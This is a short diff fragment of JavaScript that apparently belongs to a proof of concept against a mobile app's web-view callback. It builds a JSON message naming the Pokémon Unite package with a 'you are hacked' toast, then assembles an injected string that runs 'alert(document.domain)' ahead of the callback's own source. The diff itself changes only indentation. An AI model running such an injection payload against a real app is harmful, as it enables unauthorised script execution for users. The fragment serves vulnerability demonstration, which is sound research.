@@ -23,12 +23,12 @@
     
     function MyCallback(callbackId, eventType, data, d, e) {
       if (window.noJump) {
-          let test_Json = JSON.stringify(
-    {"packageName": "jp.pokemon.pokemonunite",
-    "trackingParameter": "test",
-    "externalJson": "test",
-    "showToast": "you are hacked",
-     "isRefresh": true
+let test_Json = JSON.stringify(
+{"packageName": "jp.pokemon.pokemonunite",
+"trackingParameter": "test",
+"externalJson": "test",
+"showToast": "you are hacked",
+"isRefresh": true
   });
         var newFunc = MyCallback.toString();
         var realFunc = "(()=>{" + 'alert(document.domain);' + newFunc + ";MyCallback();})();//"
